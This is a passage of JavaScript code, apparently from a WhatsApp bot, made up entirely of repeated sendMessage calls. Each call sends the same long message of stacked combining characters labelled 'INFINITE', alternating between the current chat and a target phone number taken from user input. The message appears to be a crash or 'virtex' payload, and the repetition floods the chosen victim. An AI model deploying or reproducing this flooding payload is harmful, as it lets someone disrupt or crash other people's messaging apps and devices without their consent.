            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
